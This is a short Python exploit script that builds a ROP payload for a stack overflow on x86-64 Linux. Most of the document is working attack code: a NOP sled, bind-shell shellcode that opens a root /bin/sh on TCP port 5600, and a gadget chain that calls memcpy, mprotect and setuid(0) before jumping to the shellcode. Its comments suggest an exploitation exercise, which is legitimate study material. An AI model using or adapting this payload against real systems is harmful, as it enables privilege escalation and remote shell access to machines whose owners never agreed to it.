from struct import pack
p64 = lambda x : pack("Q",x)			# function to convert to little endian
i = 0x40					# for stack shifts outside gdb
libc = 0x00007ffff79f5000			# libc base address (change according to your system)
shellcode = "\x90"*26				# NOP sled
shellcode+= "\x48\x31\xc0\x48\x31\xf6\x99\x6a\x29\x58\xff"
shellcode+= "\xc6\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66"
shellcode+= "\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x10"
shellcode+= "\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58"
shellcode+= "\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03"
shellcode+= "\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31"
shellcode+= "\xc0\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
shellcode+= "\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05"      # 86 bytes bind tcp port 5600 /bin/sh shellcode
pad = 'B'*8					# just for padding
dest = p64(0x00007ffff7dd1000)			# area to copy to
memcpy = p64(libc+0xb2290)			# add memcpy function offset to libc
source = p64(0x7fffffffe0b0+i)			# source address of shellcode in stack (dump stack in gdb to find it)
scode_size = p64(len(shellcode))		# size of shellcode to copy
mprotect = p64(libc+0x10ed40)			# add mprotect function offset to libc
pop_rdx_rsi = p64(libc+0x123189)		# pop rdx; pop rsi; ret;
pop_rdi = p64(libc+0x20b8b)			# pop rdi; ret;
perm = p64(0x5)					# permission read|execute (0x5). Convert to little endian to get it on stack
pagesize = p64(0x1000)				# just pagesize
setuid = p64(libc+0xd9b50)			# add setuid function offset to libc
null = p64(0x0)				        # null for setuid(0)

payload = shellcode + pad
payload+= pop_rdi + dest			# get destination argument into rdi register
payload+= pop_rdx_rsi + scode_size + source	# get size and source arguments in rdx and rsi registers respectively
payload+= memcpy				# return to memcpy function

payload+= pop_rdi + dest			# get destination argument into rdi register. Page boundary for mprotect.
payload+= pop_rdx_rsi + perm + pagesize		# get permission and size arguments in rdx and rsi registers respectively
payload+= mprotect				# return to memcpy function

payload+= pop_rdi + null                        # null for setuid(0) into rdi
payload+= setuid                                # call setuid

payload+= dest					# return to new location of shellcode

print(payload)